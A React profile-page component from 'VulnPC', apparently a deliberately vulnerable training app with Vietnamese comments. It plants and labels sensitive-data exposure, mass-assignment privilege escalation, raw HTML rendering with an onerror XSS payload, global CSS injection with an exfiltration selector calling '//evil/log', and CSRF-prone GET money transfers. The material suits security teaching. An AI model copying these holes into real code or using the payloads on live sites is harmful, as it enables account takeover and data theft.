import React, { useEffect, useState } from "react";
import Session from "supertokens-auth-react/recipe/session";
import api from "../api.js";

/* Hồ sơ cá nhân.
   [VULN #44] /api/auth/me trả FULL row (password hash, cc, api key)
   [VULN #51] mass assignment: PUT mọi field (role, is_admin, balance...)
   [VULN #12] bio HTML render raw (HTML injection)
   [VULN #13] theme CSS người dùng inject vào <style>
   [VULN #9] chuyển tiền ví bằng GET (CSRF) — không CSRF token, cookie SameSite=None */
export default function Profile() {
  const [profile, setProfile] = useState(null);
  const [form, setForm] = useState({ role: "user", is_admin: false, balance: 0, full_name: "", phone: "", address: "" });
  const [bioHtml, setBioHtml] = useState("<i>PC builder từ 2010</i><img src=x onerror=alert(1)>");
  const [themeCss, setThemeCss] = useState("body { background: #0d1117 } .card { border-color: #58a6ff }");
  const [out, setOut] = useState("");
  const [transfer, setTransfer] = useState({ to: "victim@vulnpc.local", amount: "10" });
  const [transferOut, setTransferOut] = useState("");

  useEffect(() => {
    (async () => {
      await Session.getUserId().catch(() => null);
      const r = await api("/api/auth/me");
      setProfile(r.data && r.data.profile);
      if (r.data && r.data.profile) {
        setForm({
          role: r.data.profile.role || "user",
          is_admin: !!r.data.profile.is_admin,
          balance: r.data.profile.balance || 0,
          full_name: r.data.profile.full_name || "",
          phone: r.data.profile.phone || "",
          address: r.data.profile.address || "",
        });
        if (r.data.profile.bio_html) setBioHtml(r.data.profile.bio_html);
        if (r.data.profile.theme_css) setThemeCss(r.data.profile.theme_css);
      }
    })();
  }, []);

  /* [VULN #13] theme CSS người dùng -> <style> global */
  useEffect(() => {
    let el = document.getElementById("user-theme");
    if (!el) {
      el = document.createElement("style");
      el.id = "user-theme";
      document.head.appendChild(el);
    }
    el.textContent = themeCss;
  }, [themeCss]);

  /* [VULN #51] mass assignment — server ghi mọi key client gửi */
  async function save(e) {
    e.preventDefault();
    const r = await api("/api/profile", { method: "PUT", body: form });
    setOut(JSON.stringify(r.data, null, 2));
  }

  /* [VULN #9] chuyển tiền qua GET + cookie SameSite=None + không CSRF token */
  async function doTransfer() {
    const r = await api(`/api/orders/transfer?to=${encodeURIComponent(transfer.to)}&amount=${encodeURIComponent(transfer.amount)}`);
    setTransferOut(JSON.stringify(r.data, null, 2));
  }

  return (
    <div>
      <h1>Hồ sơ</h1>

      <div className="card">
        <h2>Full row từ /api/auth/me (sensitive data exposure #44)</h2>
        <pre>{JSON.stringify(profile, null, 2)}</pre>
      </div>

      <div className="card">
        <h2>Thông tin cá nhân (mass assignment #51)</h2>
        <div className="row">
          <div>
            <label>Họ tên</label>
            <input value={form.full_name} onChange={(e) => setForm({ ...form, full_name: e.target.value })} />
          </div>
          <div>
            <label>Điện thoại</label>
            <input value={form.phone} onChange={(e) => setForm({ ...form, phone: e.target.value })} />
          </div>
          <div>
            <label>Địa chỉ</label>
            <input value={form.address} onChange={(e) => setForm({ ...form, address: e.target.value })} />
          </div>
        </div>
        <div className="row">
          <div>
            <label>role (escalation #13)</label>
            <input value={form.role} onChange={(e) => setForm({ ...form, role: e.target.value })} />
          </div>
          <div>
            <label>is_admin</label>
            <input type="checkbox" checked={form.is_admin} onChange={(e) => setForm({ ...form, is_admin: e.target.checked })} />
          </div>
          <div>
            <label>balance (ví $)</label>
            <input value={form.balance} onChange={(e) => setForm({ ...form, balance: e.target.value })} />
          </div>
          <button className="danger" onClick={save}>
            💾 Save (PUT mọi field)
          </button>
        </div>
        <p className="hint">
          Bật is_admin + role=admin rồi vào trang <b>Admin</b> — privilege escalation #13/#51. Server ghi mọi key client
          gửi (cột SQL cũng từ client — bonus SQLi #1).
        </p>
        {out && <pre>{out}</pre>}
      </div>

      <div className="card">
        <h2>Bio (HTML injection #12)</h2>
        <p className="hint">HTML render thẳng dưới đây — form login giả hay &lt;img onerror&gt; đều chạy.</p>
        <div className="row" style={{ width: "100%" }}>
          <textarea rows={2} value={bioHtml} onChange={(e) => setBioHtml(e.target.value)} style={{ flex: 1 }} />
          <button
            className="primary"
            onClick={async () => {
              const r = await api("/api/profile", { method: "PUT", body: { bio_html: bioHtml } });
              setOut(JSON.stringify(r.data, null, 1));
            }}
          >
            Lưu bio
          </button>
        </div>
        <div className="comment" dangerouslySetInnerHTML={{ __html: bioHtml }} />
      </div>

      <div className="card">
        <h2>Tùy biến giao diện (CSS injection #13)</h2>
        <p className="hint">
          CSS của bạn được inject thẳng vào &lt;style&gt; — attribute selector exfil dữ liệu input:{" "}
          <code>input[value^="4"] &#123; background: url("//evil/log") &#125;</code>
        </p>
        <div className="row" style={{ width: "100%" }}>
          <textarea rows={2} value={themeCss} onChange={(e) => setThemeCss(e.target.value)} style={{ flex: 1 }} />
          <button
            className="primary"
            onClick={async () => {
              await api("/api/profile", { method: "PUT", body: { theme_css: themeCss } });
              setOut("theme saved");
            }}
          >
            Áp dụng theme
          </button>
        </div>
      </div>

      <div className="card">
        <h2>💳 Ví VulnPC — chuyển tiền (CSRF #9)</h2>
        <p className="hint">
          <b>GET</b> <code>/api/orders/transfer</code> + cookie SameSite=None + không CSRF token — mở{" "}
          <code>/csrf-demo.html</code> ở tab khác để exploit chéo site. Số âm = tự cộng tiền (#54).
        </p>
        <div className="row">
          <input value={transfer.to} onChange={(e) => setTransfer({ ...transfer, to: e.target.value })} />
          <input value={transfer.amount} onChange={(e) => setTransfer({ ...transfer, amount: e.target.value })} style={{ width: 100 }} />
          <button className="danger" onClick={doTransfer}>
            Chuyển (GET)
          </button>
        </div>
        {transferOut && <pre>{transferOut}</pre>}
      </div>
    </div>
  );
}
